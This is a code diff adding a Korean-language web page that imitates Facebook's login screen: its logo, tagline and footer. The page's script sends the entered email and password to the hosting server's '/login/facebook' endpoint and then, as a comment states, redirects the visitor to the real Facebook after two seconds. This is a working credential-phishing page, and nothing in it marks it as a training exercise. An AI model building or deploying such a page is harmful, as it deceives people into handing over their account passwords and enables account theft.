@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - 로그인 또는 가입</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            min-height: calc(100vh - 200px);
+        }
+
+        .container {
+            display: flex;
+            max-width: 980px;
+            width: 100%;
+            align-items: center;
+            gap: 60px;
+        }
+
+        .left-section {
+            flex: 1;
+            max-width: 580px;
+        }
+
+        .facebook-logo {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            font-family: 'Klavika Bold', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            letter-spacing: -2px;
+        }
+
+        .tagline {
+            color: #1c1e21;
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+        }
+
+        .right-section {
+            flex: 1;
+            max-width: 396px;
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .form-input {
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            background: white;
+            color: #1c1e21;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .form-input::placeholder {
+            color: #90949c;
+        }
+
+        .login-button {
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background: #166fe5;
+        }
+
+        .login-button:active {
+            background: #1464d0;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-button {
+            background: #42b883;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .create-button:hover {
+            background: #36a370;
+        }
+
+        .create-page-link {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .create-page-link a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .create-page-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background: white;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-languages {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 12px;
+        }
+
+        .footer-languages a {
+            color: #8a8d91;
+            text-decoration: none;
+            padding: 0 2px;
+        }
+
+        .footer-languages a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-languages .current-lang {
+            color: #1c1e21;
+            font-weight: 600;
+        }
+
+        .more-languages {
+            background: #f0f2f5;
+            border: 1px solid #ccd0d5;
+            border-radius: 2px;
+            color: #4b4f56;
+            font-size: 12px;
+            padding: 0 6px;
+            cursor: pointer;
+            height: 20px;
+            line-height: 18px;
+        }
+
+        .more-languages:hover {
+            background: #e4e6ea;
+        }
+
+        .footer-divider {
+            border-top: 1px solid #dadde1;
+            margin: 8px 0;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            padding: 0 2px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            color: #8a8d91;
+            font-size: 11px;
+            margin-top: 8px;
+        }
+
+        .message {
+            padding: 12px;
+            margin: 16px 0;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .back-link {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: white;
+            padding: 10px 15px;
+            border-radius: 20px;
+            text-decoration: none;
+            color: #1877f2;
+            font-weight: 600;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        .back-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                gap: 40px;
+                text-align: center;
+            }
+
+            .left-section {
+                max-width: none;
+            }
+
+            .tagline {
+                width: auto;
+                font-size: 24px;
+            }
+
+            .facebook-logo {
+                font-size: 48px;
+            }
+        }
+
+        @media (max-width: 500px) {
+            .login-box {
+                box-shadow: none;
+                border: none;
+                background: transparent;
+                padding: 0;
+            }
+
+            .form-input {
+                font-size: 16px;
+            }
+
+            .facebook-logo {
+                font-size: 40px;
+            }
+
+            .tagline {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <a href="/" class="back-link">← 돌아가기</a>
+    
+    <div class="main-content">
+        <div class="container">
+            <div class="left-section">
+                <div class="facebook-logo">facebook</div>
+                <div class="tagline">Facebook에서 전세계에 있는 친구, 가족, 지인들과 함께 이야기를 나누어보세요.</div>
+            </div>
+
+            <div class="right-section">
+                <div class="login-box">
+                    <form class="login-form" id="loginForm">
+                        <input type="email" class="form-input" name="email" placeholder="이메일 또는 전화번호" required>
+                        <input type="password" class="form-input" name="password" placeholder="비밀번호" required>
+                        <button type="submit" class="login-button">로그인</button>
+                    </form>
+
+                    <div class="forgot-password">
+                        <a href="#">비밀번호를 잊으셨나요?</a>
+                    </div>
+
+                    <div class="divider"></div>
+
+                    <div class="create-account">
+                        <button class="create-button">새 계정 만들기</button>
+                    </div>
+
+                    <div id="message"></div>
+                </div>
+
+                <div class="create-page-link">
+                    유명인, 밴드, 비즈니스를 위한 <a href="#">페이지 만들기</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-languages">
+                <a href="#" class="current-lang">한국어</a>
+                <a href="#">English (US)</a>
+                <a href="#">Tiếng Việt</a>
+                <a href="#">Bahasa Indonesia</a>
+                <a href="#">ภาษาไทย</a>
+                <a href="#">Español</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">日本語</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Deutsch</a>
+                <button class="more-languages">+</button>
+            </div>
+            <div class="footer-divider"></div>
+            <div class="footer-links">
+                <a href="#">가입하기</a>
+                <a href="#">로그인</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">동영상</a>
+                <a href="#">장소</a>
+                <a href="#">게임</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Meta Store</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Meta</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">기금 모금 캠페인</a>
+                <a href="#">서비스</a>
+                <a href="#">투표 정보 허브</a>
+                <a href="#">개인정보처리방침</a>
+                <a href="#">개인정보 센터</a>
+                <a href="#">그룹</a>
+                <a href="#">정보</a>
+                <a href="#">광고 만들기</a>
+                <a href="#">페이지 만들기</a>
+                <a href="#">개발자</a>
+                <a href="#">채용정보</a>
+                <a href="#">쿠키</a>
+                <a href="#">AdChoices</a>
+                <a href="#">이용 약관</a>
+                <a href="#">도움말</a>
+                <a href="#">연락처 업로드 및 비사용자</a>
+                <a href="#">설정</a>
+                <a href="#">활동 로그</a>
+            </div>
+            <div class="footer-copyright">Meta © 2024</div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const messageDiv = document.getElementById('message');
+            
+            try {
+                const response = await fetch('/login/facebook', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    messageDiv.innerHTML = '<div class="message success">' + result.message + '</div>';
+                    // 2초 후 실제 Facebook으로 리다이렉트
+                    setTimeout(() => {
+                        window.location.href = result.redirect_url;
+                    }, 2000);
+                } else {
+                    messageDiv.innerHTML = '<div class="message error">' + result.message + '</div>';
+                }
+            } catch (error) {
+                messageDiv.innerHTML = '<div class="message error">로그인 중 오류가 발생했습니다.</div>';
+            }
+        });
+
+        // Facebook 스타일 입력 필드 효과
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#1877f2';
+                this.style.boxShadow = '0 0 0 2px #e7f3ff';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#dddfe2';
+                    this.style.boxShadow = 'none';
+                }
+            });
+        });
+
+        // 새 계정 만들기 버튼 클릭 이벤트
+        document.querySelector('.create-button').addEventListener('click', function() {
+            alert('새 계정 만들기 기능입니다.');
+        });
+    </script>
+</body>
+</html>
